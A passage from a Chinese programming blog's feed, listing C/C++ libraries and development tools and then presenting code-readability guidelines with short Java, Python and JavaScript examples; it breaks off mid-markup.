库</li><li>ITK：跨平台的开源图像分析系统</li><li>Magick++：ImageMagick程序的C++接口</li><li>MagickWnd：ImageMagick程序的C++接口</li><li>OpenCV ： 开源计算机视觉类库</li><li>tesseract-ocr：OCR引擎</li><li>VIGRA ：用于图像分析通用C++计算机视觉库</li><li>VTK ：用于3D计算机图形学，图像处理和可视化的开源免费软件系统。</li></ul><p>国际化</p><ul><li>gettext ：GNU `gettext’</li><li>IBM ICU：提供Unicode 和全球化支持的C、C++ 和Java库</li><li>libiconv ：用于不同字符编码之间的编码转换库</li></ul><p>Jason</p><ul><li>frozen ： C/C++的Jason解析生成器</li><li>Jansson ：进行编解码和处理Jason数据的C语言库</li><li>jbson ：C++14中构建和迭代BSON data,和Json 文档的库</li><li>JeayeSON：非常健全的C++ JSON库，只包含头文件</li><li>JSON++ ： C++ JSON 解析器</li><li>json-parser：用可移植的ANSI C编写的JSON解析器，占用内存非常少</li><li>json11 ：一个迷你的C++11 JSON库</li><li>jute ：非常简单的C++ JSON解析器</li><li>ibjson：C语言中的JSON解析和打印库，很容易和任何模型集成。</li><li>libjson：轻量级的JSON库</li><li>PicoJSON：C++中JSON解析序列化，只包含头文件</li><li>qt-json ：用于JSON数据和 QVariant层次间的相互解析的简单类</li><li>QJson：将JSON数据映射到QVariant对象的基于Qt的库</li><li>RapidJSON： 用于C++的快速JSON 解析生成器，包含SAX和DOM两种风格的API</li><li>YAJL ：C语言中快速流JSON解析库</li></ul><p>日志</p><ul><li>Boost.Log ：设计非常模块化，并且具有扩展性</li><li>easyloggingpp：C++日志库，只包含单一的头文件。</li><li>Log4cpp ：一系列C++类库，灵活添加日志到文件，系统日志，IDSA和其他地方。</li><li>templog：轻量级C++库，可以添加日志到你的C++应用程序中</li></ul><p>机器学习</p><ul><li>Caffe ：快速的神经网络框架</li><li>CCV ：以C语言为核心的现代计算机视觉库</li><li>mlpack ：可扩展的C++机器学习库</li><li>OpenCV：开源计算机视觉库</li><li>Recommender：使用协同过滤进行产品推荐/建议的C语言库。</li><li>SHOGUN：Shogun 机器学习工具</li><li>sofia-ml ：用于机器学习的快速增量算法套件</li></ul><p>数学</p><ul><li>Armadillo ：高质量的C++线性代数库，速度和易用性做到了很好的平衡。语法和MatlAB很相似</li><li>blaze：高性能的C++数学库，用于密集和稀疏算法。</li><li>ceres-solver ：来自谷歌的C++库，用于建模和解决大型复杂非线性最小平方问题。</li><li>CGal： 高效，可靠的集合算法集合</li><li>cml ：用于游戏和图形的免费C++数学库</li><li>Eigen ：高级C++模板头文件库，包括线性代数，矩阵，向量操作，数值解决和其他相关的算法。</li><li>GMTL：数学图形模板库是一组广泛实现基本图形的工具。</li><li>GMP：用于个高精度计算的C/C++库，处理有符号整数，有理数和浮点数。</li></ul><p>多媒体</p><ul><li>GStreamer ：构建媒体处理组件图形的库</li><li>LIVE555 Streaming Media ：使用开放标准协议(RTP/RTCP, RTSP, SIP) 的多媒体流库</li><li>libVLC ：libVLC (VLC SDK)媒体框架</li><li>QtAv：基于Qt和FFmpeg的多媒体播放框架，能够帮助你轻而易举地编写出一个播放器</li><li>SDL ：简单直控媒体层</li><li>SFML ：快速，简单的多媒体库</li></ul><p>网络</p><ul><li>ACE：C++面向对象网络变成工具包</li><li>Boost.Asio：用于网络和底层I/O编程的跨平台的C++库</li><li>Casablanca：C++ REST SDK</li><li>cpp-netlib：高级网络编程的开源库集合</li><li>Dyad.c：C语言的异步网络</li><li>libcurl :多协议文件传输库</li><li>Mongoose：非常轻量级的网络服务器</li><li>Muduo ：用于Linux多线程服务器的C++非阻塞网络库</li><li>net_skeleton ：C/C++的TCP 客户端/服务器库</li><li>nope.c ：基于C语言的超轻型软件平台，用于可扩展的服务器端和网络应用。 对于C编程人员，可以考虑node.js</li><li>Onion :C语言HTTP服务器库，其设计为轻量级，易使用。</li><li>POCO：用于构建网络和基于互联网应用程序的C++类库，可以运行在桌面，服务器，移动和嵌入式系统。</li><li>RakNet：为游戏开发人员提供的跨平台的开源C++网络引擎。</li><li>Tuf o ：用于Qt之上的C++构建的异步Web框架。</li><li>WebSocket++ ：基于C++/Boost Aiso的websocket 客户端/服务器库</li><li>ZeroMQ ：高速，模块化的异步通信库</li></ul><p>物理学</p><p>动力学仿真引擎</p><ul><li>Box2D：2D的游戏物理引擎。</li><li>Bullet ：3D的游戏物理引擎。</li><li>Chipmunk ：快速，轻量级的2D游戏物理库</li><li>LiquidFun：2D的游戏物理引擎</li><li>ODE ：开放动力学引擎-开源，高性能库，模拟刚体动力学。</li><li>ofxBox2d：Box2D开源框架包装器。</li><li>Simbody ：高性能C++多体动力学/物理库，模拟关节生物力学和机械系统，像车辆，机器人和人体骨骼。</li></ul><p>机器人学</p><ul><li>MOOS-IvP ：一组开源C++模块，提供机器人平台的自主权，尤其是自主的海洋车辆。</li><li>MRPT：移动机器人编程工具包</li><li>PCL ：点云库是一个独立的，大规模的开放项目，用于2D/3D图像和点云处理。</li><li>Robotics Library (RL)： 一个独立的C++库，包括机器人动力学，运动规划和控制。</li><li>RobWork：一组C++库的集合，用于机器人系统的仿真和控制。</li><li>ROS ：机器人操作系统，提供了一些库和工具帮助软件开发人员创建机器人应用程序。</li></ul><p>科学计算</p><ul><li>FFTW :用一维或者多维计算DFT的C语言库。</li><li>GSL：GNU科学库。</li></ul><p>脚本</p><ul><li>ChaiScript ：用于C++的易于使用的嵌入式脚本语言。</li><li>Lua ：用于配置文件和基本应用程序脚本的小型快速脚本引擎。</li><li>luacxx：用于创建Lua绑定的C++ 11 API</li><li>SWIG ：一个可以让你的C++代码链接到JavaScript，Perl，PHP，Python，Tcl和Ruby的包装器/接口生成器</li><li>V7：嵌入式的JavaScript 引擎。</li><li>V8 ：谷歌的快速JavaScript引擎，可以被嵌入到任何C++应用程序中。</li></ul><p>序列化</p><ul><li>Cap’n Proto ：快速数据交换格式和RPC系统。</li><li>cereal ：C++11 序列化库</li><li>FlatBuffers ：内存高效的序列化库</li><li>MessagePack ：C/C++的高效二进制序列化库，例如 JSON</li><li>protobuf ：协议缓冲，谷歌的数据交换格式。</li><li>protobuf-c ：C语言的协议缓冲实现</li><li>SimpleBinaryEncoding：用于低延迟应用程序的对二进制格式的应用程序信息的编码和解码。</li><li>Thrift ：高效的跨语言IPC/RPC，用于C++，Java，Python，PHP，C#和其它多种语言中，最初由Twitter开发。</li></ul><p>视频</p><ul><li>libvpx ：VP8/VP9编码解码SDK</li><li>FFmpeg ：一个完整的，跨平台的解决方案，用于记录，转换视频和音频流。</li><li>libde265 ：开放的h.265视频编解码器的实现。</li><li>OpenH264：开源H.364 编解码器。</li><li>Theora ：免费开源的视频压缩格式。</li></ul><p>虚拟机</p><ul><li>CarpVM：C中有趣的VM，让我们一起来看看这个。</li><li>MicroPython ：旨在实现单片机上Python3.x的实现</li><li>TinyVM：用纯粹的ANSI C编写的小型，快速，轻量级的虚拟机。</li></ul><p>Web应用框架</p><ul><li>Civetweb ：提供易于使用，强大的，C/C++嵌入式Web服务器，带有可选的CGI，SSL和Lua支持。</li><li>CppCMS ：免费高性能的Web开发框架（不是 CMS）.</li><li>Crow ：一个C++微型web框架（灵感来自于Python Flask）</li><li>Kore :使用C语言开发的用于web应用程序的超快速和灵活的web服务器/框架。</li><li>libOnion：轻量级的库，帮助你使用C编程语言创建web服务器。</li><li>QDjango：使用C++编写的，基于Qt库的web框架，试图效仿Django API，因此得此名。</li><li>Wt ：开发Web应用的C++库。</li></ul><p>XML</p><p>XML就是个垃圾，xml的解析很烦人，对于计算机它也是个灾难。这种糟糕的东西完全没有存在的理由了。-Linus Torvalds</p><ul><li>Expat ：用C语言编写的xml解析库</li><li>Libxml2 ：Gnome的xml C解析器和工具包</li><li>libxml++ ：C++的xml解析器</li><li>PugiXML ：用于C++的，支持XPath的轻量级，简单快速的XML解析器。</li><li>RapidXml ：试图创建最快速的XML解析器，同时保持易用性，可移植性和合理的W3C兼容性。</li><li>TinyXML ：简单小型的C++XML解析器，可以很容易地集成到其它项目中。</li><li>TinyXML2：简单快速的C++CML解析器，可以很容易集成到其它项目中。</li><li>TinyXML++：TinyXML的一个全新的接口，使用了C++的许多许多优势，模板，异常和更好的异常处理。</li><li>Xerces-C++ ：用可移植的C++的子集编写的XML验证解析器。</li></ul><p>多项混杂</p><p>一些有用的库或者工具，但是不适合上面的分类，或者还没有分类。</p><ul><li>C++ Format ：C++的小型，安全和快速格式化库</li><li>casacore ：从aips++ 派生的一系列C++核心库</li><li>cxx-prettyprint：用于C++容器的打印库</li><li>DynaPDF ：易于使用的PDF生成库</li><li>gcc-poison ：帮助开发人员禁止应用程序中的不安全的C/C++函数的简单的头文件。</li><li>googlemock：编写和使用C++模拟类的库</li><li>HTTP Parser ：C的http请求/响应解析器</li><li>libcpuid ：用于x86 CPU检测盒特征提取的小型C库</li><li>libevil ：许可证管理器</li><li>libusb：允许移动访问USB设备的通用USB库</li><li>PCRE：正则表达式C库，灵感来自于Perl中正则表达式的功能。</li><li>Remote Call Framework ：C++的进程间通信框架。</li><li>Scintilla ：开源的代码编辑控件</li><li>Serial Communication Library ：C++语言编写的跨平台，串口库。</li><li>SDS：C的简单动态字符串库</li><li>SLDR ：超轻的DNS解析器</li><li>SLRE： 超轻的正则表达式库</li><li>Stage ：移动机器人模拟器</li><li>VarTypes：C++/Qt4功能丰富，面向对象的管理变量的框架。</li><li>ZBar：‘条形码扫描器’库，可以扫描照片，图片和视频流中的条形码，并返回结果。</li><li>CppVerbalExpressions ：易于使用的C++正则表达式</li><li>QtVerbalExpressions：基于C++ VerbalExpressions 库的Qt库</li><li>PHP-CPP：使用C++来构建PHP扩展的库</li><li>Better String ：C的另一个字符串库，功能更丰富，但是没有缓冲溢出问题，还包含了一个C++包装器。</li></ul><p>软件</p><p>用于创建开发环境的软件<br>编译器</p><p>C/C++编译器列表</p><ul><li>Clang :由苹果公司开发的</li><li>GCC：GNU编译器集合</li><li>Intel C++ Compiler ：由英特尔公司开发</li><li>LLVM ：模块化和可重用编译器和工具链技术的集合</li><li>Microsoft Visual C++ ：MSVC，由微软公司开发</li><li>Open WatCom ：Watcom，C，C++和Fortran交叉编译器和工具</li><li>TCC ：轻量级的C语言编译器</li></ul><p>在线编译器</p><p>在线C/C++编译器列表</p><ul><li>codepad ：在线编译器/解释器，一个简单的协作工具</li><li>CodeTwist：一个简单的在线编译器/解释器，你可以粘贴的C,C++或者Java代码，在线执行并查看结果</li><li>coliru ：在线编译器/shell， 支持各种C++编译器</li><li>Compiler Explorer：交互式编译器，可以进行汇编输出</li><li>CompileOnline：Linux上在线编译和执行C++程序</li><li>Ideone ：一个在线编译器和调试工具，允许你在线编译源代码并执行，支持60多种编程语言。</li></ul><p>调试器</p><p>C/C++调试器列表</p><ul><li>Comparison of debuggers ：来自维基百科的调试器列表</li><li>GDB ：GNU调试器</li><li>Valgrind：内存调试，内存泄露检测，性能分析工具。</li></ul><p>集成开发环境（IDE）</p><p>C/C++集成开发环境列表</p><ul><li>AppCode ：构建与JetBrains’ IntelliJ IDEA 平台上的用于Objective-C，C,C++，Java和Java开发的集成开发环境</li><li>CLion：来自JetBrains的跨平台的C/C++的集成开发环境</li><li>Code::Blocks ：免费C，C++和Fortran的集成开发环境</li><li>CodeLite ：另一个跨平台的免费的C/C++集成开发环境</li><li>Dev-C++：可移植的C/C++/C++11集成开发环境</li><li>Eclipse CDT：基于Eclipse平台的功能齐全的C和C++集成开发环境</li><li>Geany ：轻量级的快速，跨平台的集成开发环境。</li><li>IBM VisualAge ：来自IBM的家庭计算机集成开发环境。</li><li>Irony-mode：由libclang驱动的用于Emacs的C/C++微模式</li><li>KDevelop：免费开源集成开发环境</li><li>Microsoft Visual Studio ：来自微软的集成开发环境</li><li>NetBeans ：主要用于Java开发的的集成开发环境，也支持其他语言，尤其是PHP，C/C++和HTML5。</li><li>Qt Creator：跨平台的C++，Javascript和QML集成开发环境，也是Qt SDK的一部分。</li><li>rtags：C/C++的客户端服务器索引，用于 跟基于clang的emacs的集成</li><li>Xcode ：由苹果公司开发</li><li>YouCompleteMe：一个用于Vim的根据你敲的代码快速模糊搜索并进行代码补全的引擎。</li></ul><p>构建系统</p><ul><li>Bear ：用于为clang工具生成编译数据库的工具</li><li>Biicode：基于文件的简单依赖管理器。</li><li>CMake ：跨平台的免费开源软件用于管理软件使用独立编译的方法进行构建的过程。</li><li>CPM：基于CMake和Git的C++包管理器</li><li>FASTBuild：高性能，开源的构建系统，支持高度可扩展性的编译，缓冲和网络分布。</li><li>Ninja ：专注于速度的小型构建系统</li><li>Scons ：使用Python scipt 配置的软件构建工具</li><li>tundra ：高性能的代码构建系统，甚至对于非常大型的软件项目，也能提供最好的增量构建次数。</li><li>tup：基于文件的构建系统，用于后台监控变化的文件。</li></ul><p>静态代码分析</p><p>提高质量，减少瑕疵的代码分析工具列表</p><ul><li>Cppcheck ：静态C/C++代码分析工具</li><li>include-what-you-use ：使用clang进行代码分析的工具，可以#include在C和C++文件中。</li><li>OCLint ：用于C，C++和Objective-C的静态源代码分析工具，用于提高质量，减少瑕疵。</li><li>Clang Static Analyzer：查找C，C++和Objective-C程序bug的源代码分析工具</li><li>List of tools for static code analysis ：来自维基百科的静态代码分析工具列表</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;C-标准库及框架自学收藏&quot;&gt;&lt;a href=&quot;#C-标准库及框架自学收藏&quot; class=&quot;headerlink&quot; title=&quot;C++标准库及框架自学收藏&quot;&gt;&lt;/a&gt;C++标准库及框架自学收藏&lt;/h2&gt;&lt;hr&gt;
&lt;p&gt;标准库&lt;/p&gt;
&lt;p&gt;C++标准库，包括了ST</summary>
      
    
    
    
    <category term="C++" scheme="https://lennon.work/categories/C/"/>
    
    
    <category term="c++" scheme="https://lennon.work/tags/c/"/>
    
    <category term="框架学习" scheme="https://lennon.work/tags/%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="标准库" scheme="https://lennon.work/tags/%E6%A0%87%E5%87%86%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title>代码可读性规范</title>
    <link href="https://lennon.work/2021/04/13/code/%E4%BB%A3%E7%A0%81%E5%8F%AF%E8%AF%BB%E6%80%A7/"/>
    <id>https://lennon.work/2021/04/13/code/%E4%BB%A3%E7%A0%81%E5%8F%AF%E8%AF%BB%E6%80%A7/</id>
    <published>2021-04-13T10:03:58.331Z</published>
    <updated>2021-04-13T10:08:20.826Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一、可读性的重要性"><a href="#一、可读性的重要性" class="headerlink" title="一、可读性的重要性"></a>一、可读性的重要性</h1><p>编程有很大一部分时间是在阅读代码，不仅要阅读自己的代码，而且要阅读别人的代码。因此，可读性良好的代码能够大大提高编程效率。</p><p>可读性良好的代码往往会让代码架构更好，因为程序员更愿意去修改这部分代码，而且也更容易修改。</p><p>只有在核心领域为了效率才可以放弃可读性，否则可读性是第一位。</p><h1 id="二、用名字表达代码含义"><a href="#二、用名字表达代码含义" class="headerlink" title="二、用名字表达代码含义"></a>二、用名字表达代码含义</h1><p>一些比较有表达力的单词：</p><table><thead><tr><th align="center">单词</th><th>可替代单词</th></tr></thead><tbody><tr><td align="center">send</td><td>deliver、dispatch、announce、distribute、route</td></tr><tr><td align="center">find</td><td>search、extract、locate、recover</td></tr><tr><td align="center">start</td><td>launch、create、begin、open</td></tr><tr><td align="center">make</td><td>create、set up、build、generate、compose、add、new</td></tr></tbody></table><p>使用 i、j、k 作为循环迭代器的名字过于简单，user_i、member_i 这种名字会更有表达力。因为循环层次越多，代码越难理解，有表达力的迭代器名字可读性会更高。</p><p>为名字添加形容词等信息能让名字更具有表达力，但是名字也会变长。名字长短的准则是：作用域越大，名字越长。因此只有在短作用域才能使用一些简单名字。</p><h1 id="三、名字不能带来歧义"><a href="#三、名字不能带来歧义" class="headerlink" title="三、名字不能带来歧义"></a>三、名字不能带来歧义</h1><p>起完名字要思考一下别人会对这个名字有何解读，会不会误解了原本想表达的含义。</p><p>布尔相关的命名加上 is、can、should、has 等前缀。</p><ul><li><p>用 min、max 表示数量范围；</p></li><li><p>用 first、last 表示访问空间的包含范围；</p></li><li><p>begin、end 表示访问空间的排除范围，即 end 不包含尾部。</p></li></ul><h1 id="四、良好的代码风格"><a href="#四、良好的代码风格" class="headerlink" title="四、良好的代码风格"></a>四、良好的代码风格</h1><p>适当的空行和缩进。</p><p>排列整齐的注释：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> a = <span class="number">1</span>;   <span class="comment">// 注释</span></span><br><span class="line"><span class="keyword">int</span> b = <span class="number">11</span>;  <span class="comment">// 注释</span></span><br><span class="line"><span class="keyword">int</span> c = <span class="number">111</span>; <span class="comment">// 注释</span></span><br></pre></td></tr></table></figure><p>语句顺序不能随意，比如与 html 表单相关联的变量的赋值应该和表单在 html 中的顺序一致。</p><h1 id="五、为何编写注释"><a href="#五、为何编写注释" class="headerlink" title="五、为何编写注释"></a>五、为何编写注释</h1><p>阅读代码首先会注意到注释，如果注释没太大作用，那么就会浪费代码阅读的时间。那些能直接看出含义的代码不需要写注释，特别是不需要为每个方法都加上注释，比如那些简单的 getter 和 setter 方法，为这些方法写注释反而让代码可读性更差。</p><p>不能因为有注释就随便起个名字，而是争取起个好名字而不写注释。</p><p>可以用注释来记录采用当前解决办法的思考过程，从而让读者更容易理解代码。</p><p>注释用来提醒一些特殊情况。</p><p>用 TODO 等做标记：</p><table><thead><tr><th>标记</th><th>用法</th></tr></thead><tbody><tr><td>TODO</td><td>待做</td></tr><tr><td>FIXME</td><td>待修复</td></tr><tr><td>HACK</td><td>粗糙的解决方案</td></tr><tr><td>XXX</td><td>危险！这里有重要的问题</td></tr></tbody></table><h1 id="六、如何编写注释"><a href="#六、如何编写注释" class="headerlink" title="六、如何编写注释"></a>六、如何编写注释</h1><p>尽量简洁明了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// The first String is student&#x27;s name</span></span><br><span class="line"><span class="comment">// The Second Integer is student&#x27;s score</span></span><br><span class="line">Map&lt;String, Integer&gt; scoreMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Student&#x27;s name -&gt; Student&#x27;s score</span></span><br><span class="line">Map&lt;String, Integer&gt; scoreMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br></pre></td></tr></table></figure><p>添加测试用例来说明：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="comment">// Example: add(1, 2), return 3</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x + y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用专业名词来缩短概念上的解释，比如用设计模式名来说明代码。</p><h1 id="七、提高控制流的可读性"><a href="#七、提高控制流的可读性" class="headerlink" title="七、提高控制流的可读性"></a>七、提高控制流的可读性</h1><p>条件表达式中，左侧是变量，右侧是常数。比如下面第一个语句正确：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (len &lt; <span class="number">10</span>)</span><br><span class="line"><span class="keyword">if</span> (<span class="number">10</span> &gt; len)</span><br></pre></td></tr></table></figure><p>只有在逻辑简单的情况下使用 ? : 三目运算符来使代码更紧凑，否则应该拆分成 if / else；</p><p>do / while 的条件放在后面，不够简单明了，并且会有一些迷惑的地方，最好使用 while 来代替。</p><p>如果只有一个 goto 目标，那么 goto 尚且还能接受，但是过于复杂的 goto 会让代码可读性特别差，应该避免使用 goto。</p><p>在嵌套的循环中，用一些 return 语句往往能减少嵌套的层数。</p><h1 id="八、拆分长表达式"><a href="#八、拆分长表达式" class="headerlink" title="八、拆分长表达式"></a>八、拆分长表达式</h1><p>长表达式的可读性很差，可以引入一些解释变量从而拆分表达式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> line.split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">0</span>].strip() == <span class="string">&quot;root&quot;</span>:</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username = line.split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">0</span>].strip()</span><br><span class="line"><span class="keyword">if</span> username == <span class="string">&quot;root&quot;</span>:</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>使用摩根定理简化一些逻辑表达式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!a &amp;&amp; !b) &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!(a || b)) &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="九、变量与可读性"><a href="#九、变量与可读性" class="headerlink" title="九、变量与可读性"></a>九、变量与可读性</h1><p><strong>去除控制流变量</strong>  。在循环中通过使用 break 或者 return 可以减少控制流变量的使用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">boolean</span> done = <span class="keyword">false</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="comment">/* condition */</span> &amp;&amp; !done) &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> ( ... ) &#123;</span><br><span class="line">        done = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="comment">/* condition */</span>) &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> ( ... ) &#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>减小变量作用域</strong>  。作用域越小，越容易定位到变量所有使用的地方。</p><p>JavaScript 可以用闭包减小作用域。以下代码中 submit_form 是函数变量，submitted 变量控制函数不会被提交两次。第一个实现中 submitted 是全局变量，第二个实现把 submitted 放到匿名函数中，从而限制了起作用域范围。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">submitted = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">var</span> submit_form = <span class="function"><span class="keyword">function</span>(<span class="params">form_name</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (submitted) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    submitted = <span class="literal">true</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> submit_form = (<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> submitted = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">form_name</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(submitted) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        submitted = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;());  <span class="comment">// () 使得外层匿名函数立即执行</span></span><br></pre></td></tr></table></figure><p>JavaScript 中没有用 var 声明的变量都是全局变量，而全局变量很容易造成迷惑，因此应当总是用 var 来声明变量。</p><p>变量定义的位置应当离它使用的位置最近。</p><p><strong>实例解析</strong>  </p><p>在一个网页中有以下文本输入字段：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">&quot;text&quot;</span> <span class="attr">id</span> = <span class="string">&quot;input1&quot;</span> <span class="attr">value</span> = <span class="string">&quot;a&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">&quot;text&quot;</span> <span class="attr">id</span> = <span class="string">&quot;input2&quot;</span> <span class="attr">value</span> = <span class="string">&quot;b&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">&quot;text&quot;</span> <span class="attr">id</span> = <span class="string">&quot;input3&quot;</span> <span class="attr">value</span> = <span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">&quot;text&quot;</span> <span class="attr">id</span> = <span class="string">&quot;input4&quot;</span> <span class="attr">value</span> = <span class="string">&quot;d&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>现在要接受一个字符串并把它放到第一个空的 input 字段中，初始实现如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> setFirstEmptyInput = <span class="function"><span class="keyword">function</span>(<span class="params">new_alue</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> found = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">var</span> i = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">var</span> elem = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;input&#x27;</span> + i);</span><br><span class="line">    <span class="keyword">while</span> (elem != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (elem.value === <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">            found = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        i++;</span><br><span class="line">        elem = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;input&#x27;</span> + i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (found) elem.value = new_value;</span><br><span class="line">    <span class="keyword">return</span> elem;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上实现有以下问题：</p><ul><li>found 可以去除；</li><li>elem 作用域过大；</li><li>可以用 for 循环代替 while 循环；</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> setFirstEmptyInput = <span class="function"><span class="keyword">function</span>(<span class="params">new_value</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; <span class="literal">true</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> elem = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;input&#x27;</span> + i);</span><br><span class="line">        <span class="keyword">if</span> (elem === <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (elem.value === <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">            elem.value = new_value;</span><br><span class="line">            <span class="keyword">return</span> elem;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="十、抽取函数"><a href="#十、抽取函数" class="headerlink" 